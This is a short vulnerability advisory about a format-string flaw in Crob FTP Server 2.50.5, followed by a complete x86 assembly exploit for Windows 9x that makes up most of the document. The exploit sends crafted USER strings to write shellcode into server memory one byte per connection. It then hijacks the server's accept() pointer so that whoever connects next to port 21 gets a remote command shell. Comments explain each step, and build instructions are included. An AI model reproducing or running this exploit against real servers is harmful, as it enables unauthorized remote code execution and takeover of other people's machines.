source: http://www.securityfocus.com/bid/7776/info

A vulnerability has been reported for Crob FTP Server. The problem occurs due to invalid format specifiers used when displaying a user-supplied username. As a result, it may be possible for an attacker to embed format specifiers within a malicious username.

Successful exploitation of this vulnerability would allow an attacker to overwrite arbitrary locations in memory, ultimately allowing for the execution of arbitrary code. All commands executed in this manner would be run with the privileges of the Crob FTP Server.

;CROB FTP SERVER 2.50.5 BUILD 238 EXPLOIT
;(c) Vecna 2003 - http://coderz.net/vecna - http://29a.host.sk
;
;f3ar the 7 dd exploitz!
;(you can loose 15 punds in 7 days!! ask me how!)
;
;This is my first exploit using format strings, and its for w9x(well, i tested
;it only in w98, but probably work in w95 too). The printf() implementation in
;use was not so flexible as the unix ones, or even the w2k one. so, i had to
;resort to some 'ugly' things to make it work.
;
;The first step in the exploit was build the shellcode in the remote server,
;using the format string exploit that existed in the USER command (USER %x%x).
;I did this connecting, sending a bugged USER string, that writed a byte of my
;shellcode, and disconnecting: once for each byte of our shellcode. By the
;limitations of the printf() implementation, we had to write one byte for USER
;string(except in very rare cases). More, i can only send 2 bugged USER strings
;for connection before the server started to act weird. So i resolved write one
;byte for connection. Our shellcode have, in two places, unused areas, that are
;in places where the address would contain zeros. When generating the format
;string, we take care of cases where the address have the '%' byte.
;
;The second step was choose someting to overwrite. I did this using a single
;bugged USER line, becoz the very special address i choose for the shellcode:
;10080601h. As we have to write 01h, 06h, 08h and then 10h, to form the address,
;the increasing way its bytes have allowed us write it with a single line(the
;printf() implementation limit the size of string to few more than 500).
;
;The overwrited address is a pointer to accept(). This allow to bypass any kind
;of firewall that maybe is installed in the server machine, as all the socket
;setup is done by the vulnerable server, and it surely have access to port 21,
;thats where we listen for remote DOS shells. :)
;
;When a connection its received, we restore the overwrited pointer, call the
;original accept(), create a new thread, to create the DOS shell, and return
;error to the server. This new thread create the pipes, get the command
;interpretert name in the environment, and spawn a shell, redirecting output
;and input to the socket we create first. Its done. The server will continue
;to work after exploited, and the first one to connect to port 21 after the
;exploit will gain a useful w9x remote shell :P
;
;greetz to Luca Ercoli, that found the bug.
;
;compile with:
;tasm32 /m /ml crobftp.asm
;tlink32 crobftp.obj,,,import32
;
;the includes, before you ask, are the ones from z0mbie, jacky qwerty, and
;others you should obtain in 29A e-zines, or figure out what they contain.



.586p
.model flat
locals

REMOTE_BASE EQU 10080600h               ;here we write our code...
ACCEPT_ADDR EQU 5F4D2090h               ;here we write our start address...
NULL_ADDR   EQU 10080538h               ;and there we write garbage
API_ADDR    EQU 1008050Ch               ;here we put our API addresses

@CREATEPROCESS EQU 1008050Ch
@CREATEPIPE    EQU 10080510h
@GETENVVAR     EQU 10080514h
@PEEKNAMEDPIPE EQU 10080518h
@READFILE      EQU 1008051Ch
@WRITEFILE     EQU 10080520h
@CREATETHREAD  EQU 10080524h
@SELECT        EQU 10080528h
@RECV          EQU 1008052Ch
@SEND          EQU 10080530h
@ACCEPT        EQU 10080534h

__WSOCK32          EQU 00503A2Ch
__KERNEL32         EQU 0059AF6Ch
__GetProcAddress   EQU 0059AF5Ch
__GetModuleHandleA EQU 0059AF60h

apicall macro addy
       db 0ffh,015h
       dd addy
endm



.xlist
include header.inc
include socket.inc
include consts.inc
.list


.data

copyright db "CROB FTP SERVER 2.50.5 BUILD 238 EXPLOIT",13,10
          db "(c) Vecna 2003 - http://coderz.net/vecna - http://29a.host.sk",13,10,0
completed db "Done! A DOS prompt should be waiting for you in port 21...",13,10,13,10,0
usage     db "USAGE: CROBFTP.EXE <server>",13,10,0

msg1      db "? Converting hostname to IP...",13,10,0
msg2      db "? Building shellcode in target: ",0
msg3      db "? Overwriting accept()...",13,10,0
msg4      db 13,10,"Error...",13,10,0

fmt       db "%%.%dx",0

.data?
argv0  db MAX_PATH dup (?)
argv1  db MAX_PATH dup (?)
argv2  db MAX_PATH dup (?)
argv3  db MAX_PATH dup (?)
argc   dd ?
ftpserver dd ?

.code


include console.inc
include cmdline.inc


shellcode:
       db 8fh,05h
       dd NULL_ADDR                     ;pop dword []

       pushad

       call @@over_api
       db "CreateProcessA",0
       db "CreatePipe",0
       db "GetEnvironmentVariableA",0
       db "PeekNamedPipe",0
       db "ReadFile",0
       db "WriteFile",0
       db "CreateThread",0,0
       db "select",0
       db "recv",0
       db "send",0
       db "accept",0,0
  @@over_api:
       pop esi
       mov edi,API_ADDR

       push __KERNEL32
       apicall __GetModuleHandleA
       xchg eax,ebx
       call @@get_next
       lodsb
       push __WSOCK32
       apicall __GetModuleHandleA
       xchg eax,ebx
       call @@get_next

       popad

       db 0a1h
       dd @ACCEPT                       ;mov eax,[]
       db 0a3h
       dd ACCEPT_ADDR                   ;mov [],eax

       call eax

       pushad

       sub ebp,ebp
       mov dwo [esp.Pushad_eax],-1          ;signal error for crob server

       push ebp
       push esp
       push ebp
       push eax
       call @@overshellcode

  @@remote_shell:
       sub edi,edi
       mov ebx,[esp.Arg1]

       push 1                   ;inherit handles
       push edi
       push 12
       mov ebp, esp

       clc
  @@pipe:
       push edi
       mov eax,esp
       push edi
       mov edx,esp

wp1 equ esp+7ch+12
rp1 equ esp+7ch+8
wp2 equ esp+7ch+4
rp2 equ esp+7ch

       pushf

       push edi
       push ebp
       push eax
       push edx
       apicall @CREATEPIPE

       popf
       cmc
       jc @@pipe			;exec 2 times ;)

       push "CEP"

       jmp @@skip100                    ;place4shit
       db 10 dup (90h)
  @@skip100:

       push "SMOC"
       mov ecx, esp

       sub esp,7ch-8
       mov esi,esp

       push 7ch
       push esi
       push ecx
       apicall @GETENVVAR

       push dwo [wp2]         ;stderr
       push dwo [wp2+4]       ;stdout
       push dwo [rp1+8]       ;stdin
       push edi
       push edi

       push 256+1             ;STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES

       push 10
       pop  ecx
       push edi         ;10*4
       loop $-1

       push 17*4
       mov edx, esp

       push edi
       push edi
       push edi
       push edi

       push esp
       push edx     ;startupinfo
       push edi
       push edi
       push edi
       push 1       ;inherit handles
       push edi
       push edi
       push esi     ;interpreter
       push edi
       apicall @CREATEPROCESS
       add esp,21*4

  @@redirect:
       push edi     ; alloc
       mov eax, esp

       push edi
       push eax
       push edi
       push edi
       push edi
       push dwo [rp2+6*4]
       apicall @PEEKNAMEDPIPE
       pop ecx     ;ecx=size of input data
       jecxz @@readsocket

       sub esp,ecx
       mov ebp,esp
       push ecx

       push edi
       push eax
       mov edx, esp
       push ebp
       push ebx

       push edi
       push edx
       push ecx
       push ebp
       push dwo [ecx+rp2+9*4]
       apicall @READFILE

       apicall @SEND

       pop eax
       add esp,eax
       jmp @@redirect

  @@readsocket:
       push ebx
       push 1
       mov eax,esp

       push 100    ;ms
       push edi    ;s

       push esp
       push edi
       push edi
       push eax
       push edi
       apicall @SELECT
       sub esp,-4*4
       test eax,eax
       jz @@redirect

       sub esp,7ch
       mov ebp,esp

       push edi
       push 7ch
       push ebp
       push ebx
       apicall @RECV

       mov ecx,esp
       push edi
       mov edx,esp

       push edi
       push edx
       push eax
       push ecx
       push dwo [wp1+5*4+7ch]
       apicall @WRITEFILE
       pop eax

       add esp,7ch
       jmp @@redirect

  @@overshellcode:
       push ebp
       push ebp
       apicall @CREATETHREAD
       pop eax

       popad
       db 0ffh,025h
       dd NULL_ADDR

  @@get_next:
       push esi
       push ebx
       apicall __GetProcAddress
       stosd
  @@seek_end:
       lodsb

       jmp @@skip200                    ;place4shit
       db 10 dup (90h)
  @@skip200:

       test al,al
       jnz @@seek_end
       cmp by [esi],0
       jne @@get_next
       ret
end_shellcode:





xploit_dumpbyte:
       sub ecx,ecx
       pushad
       call connect2ftp
       jz @@close_socket

       sub esp, 8192
       mov edi,esp
       mov eax,"RESU"
       stosd
       mov eax,"VVV "                   ;the 4 align...
       stosd
       mov al,"V"
       stosd                            ;the padding...
       stosd
       stosd
       mov eax,[esp.cPushad.Arg1+8192]  ;the address...
       mov edx,eax
       stosd

       mov ecx,133
       mov eax,"x8.%"
       rep stosd                        ;the poppers...

       mov eax,[esp.cPushad.Arg2+8192]
       movzx eax,al
       cmp dl, "%"
       jne @@skipskipskip
       inc eax
  @@skipskipskip:
       add eax,0abh
       push eax
       push ofs fmt
       push edi
       callW _wsprintfA                 ;the value adjust...
       add esp, 3*4

       mov esi,edi
  @@seek0:
       lodsb
       test al,al
       jnz @@seek0
       lea edi,[esi-1]

       mov eax,0a0d0000h+"n%"           ;the write!
       stosd

       mov esi,esp
       sub edi,esi

       push 0
       push edi
       push esi
       push ebx
       callW send

       add esp, 8192
       mov [esp.Pushad_ecx],esp
  @@close_socket:
       push ebx
       callW closesocket

  @@error:
       popad
       ret 2*4





xploit_overwrite:
       pushad

       call connect2ftp
       jz @@close_socket

       sub esp,8192
       mov edi,esp

       mov eax,"RESU"
       stosd
       mov eax,"VVV "                   ;the 4 align...
       stosd
       mov eax,ACCEPT_ADDR
       stosd                            ;the 4 addresses...
       inc eax
       stosd
       inc eax
       stosd
       inc eax
       stosd

       mov ecx,9
       mov eax,"f1.%"
       rep stosd                        ;the first poppers...

       mov eax,10080701h
       stosd                            ;more 4 addresses(garbage)...
       stosd
       stosd
       stosd

       mov ecx,62
       mov eax,"f1.%"
       rep stosd                        ;more poppers...

       mov eax,"x8.%"
       stosd                            ;other popper
       mov eax,"01.%"
       stosd                            ;the value adjust...
       mov eax,"n%x1"
       stosd                            ;the first write!
       mov eax,"VVVV"
       stosd                            ;adjust value...
       mov eax,"Vn%V"
       stosd                            ;second write! and adjust...
       stosd                            ;third write! and adjust...
       mov eax,"VVVV"
       stosd
       mov eax,"%VVV"
       stosd                            ;adjust value some more
       mov eax,0a0d00h+"n"
       stosd                            ;write and goodbye!
       dec edi

       mov ecx,esp
       sub edi,ecx

       push 0
       push edi
       push ecx
       push ebx
       callW send

       sub esp,-8192
  @@close_socket:
       push ebx
       callW closesocket
  @@error:
       popad
       ret





connect2ftp:
       push IPPROTO_TCP
       push SOCK_STREAM
       push PF_INET
       callW socket
       mov ebx,eax
       inc eax
       jz @@error

       push 0
       push 0
       push dwo [ftpserver]
       push 21
       callW htons
       shl eax,16
       mov ax, 2
       push eax
       mov eax, esp

       push 16
       push eax
       push ebx
       callW connect
       add esp, 4*4
       test eax,eax
       jnz @@error

       sub esp, 1024
       mov esi,esp
       push 0
       push 1024
       push esi
       push ebx
       callW recv
       sub esp, -1024
       inc eax
       jz @@error

  @@fine:
       cmp ax,1234h
     org $-2
  @@error:
       sub eax,eax
       ret





start:
       mov edx, ofs copyright
       call dump_asciiz_edx

       call getcmdline

       mov edx, ofs usage
       cmp dwo [argc],2
       jne @@exit

       sub esp, 200h
       push esp
       push 1
       callW WSAStartup
       sub esp, -200h

       lea esi,argv1

       push esi
       callW inet_addr
       cmp eax,-1
       jnz @@done

       mov edx, ofs msg1
       call dump_asciiz_edx

       push esi
       callW gethostbyname
       test eax,eax
       jz @@exit
       mov eax,[eax+12]
       mov eax,[eax]
       mov eax,[eax]
  @@done:
       mov dwo [ftpserver],eax

       mov edx, ofs msg2
       call dump_asciiz_edx

       lea edx,msg4
       mov esi, ofs shellcode
       mov ebp,REMOTE_BASE
  @@send_shell:
       push 100
       callW Sleep
       mov al,"."
       call dump_al
       inc ebp
       lodsb
       mov ecx,ebp
       test cl,cl
       jz @@skipit
       push eax
       push ebp
       call xploit_dumpbyte             ;send 1 byte from shellcode
       jecxz @@exit
  @@skipit:
       cmp esi, ofs end_shellcode
       jne @@send_shell

       call dump_crlf
       mov edx, ofs msg3
       call dump_asciiz_edx

       push 1000
       callW Sleep
       call xploit_overwrite            ;overwrite accept()

       callW WSACleanup

       mov edx, ofs completed
  @@exit:
       call dump_asciiz_edx
       push 0
       callW ExitProcess

end    start
